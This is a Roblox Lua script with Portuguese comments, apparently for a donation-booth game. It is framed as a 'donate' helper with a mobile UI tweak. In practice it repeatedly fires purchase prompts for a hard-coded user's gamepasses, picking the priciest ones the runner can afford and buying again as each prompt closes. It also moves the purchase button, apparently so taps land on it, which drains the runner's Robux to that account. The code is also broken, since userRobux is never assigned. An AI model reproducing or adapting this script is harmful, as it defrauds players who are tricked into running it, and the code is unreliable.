local LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")

local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))

-- Substitua isso pelo username do player que você quer doar
local Username = "Ian_wp27"

local success, UserId = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)
end)

local asset
local userRobux

if success then
    local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
    if not Booth then
        return Players.LocalPlayer:Kick("Receiver not found!")
    end

    local function Purchase()
        local range = 0
        for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
            if v:GetAttribute("AssetType") == "Gamepass" and
               not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
                local price = v:GetAttribute("AssetPrice")
                -- Escolhe o preço mais alto que consegue pagar
                if price and price <= userRobux and price > range then
                    asset = v
                    range = price
                end
            end
        end

        if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
            asset.Prompt:FireServer("", false, range)
        end
    end

    -- Ajuste da UI para mobile
    local PurchasePromptApp
    repeat
        PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
        task.wait(0.1)
    until PurchasePromptApp

    local Animator = PurchasePromptApp:WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    repeat task.wait() until not Animator:FindFirstChild("Prompt")

    Animator.ChildAdded:Connect(function(child)
        if child.Name == "Prompt" then
            -- Ajuste do botão de compra para mobile (esquerda)
            local buttons = child.AlertContents.Footer.Buttons
            if buttons["2"] then
                buttons["2"].Position = UDim2.new(0, 10, buttons["2"].Position.Y.Scale, buttons["2"].Position.Y.Offset)
            end
        end
    end)

    Animator.ChildRemoved:Connect(function(child)
        if child.Name == "Prompt" and userRobux then
            if not asset or not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, asset:GetAttribute("AssetId")) then
                Purchase()
            end
        end
    end)

    -- Evento de gift
    Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
        if a == UserId and userRobux then
            -- Aqui você pode colocar a função de webhook se quiser
            userRobux -= robux
            Purchase()
        end
    end)

    -- Compra inicial do item que consegue pagar mais caro
    local range = math.huge
    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
        if v:GetAttribute("AssetType") == "Gamepass" and
           not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
            local price = v:GetAttribute("AssetPrice")
            if price <= userRobux and price < range then
                asset = v
                range = price
            end
        end
    end

    if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
        asset.Prompt:FireServer("", false, range)
    end
end
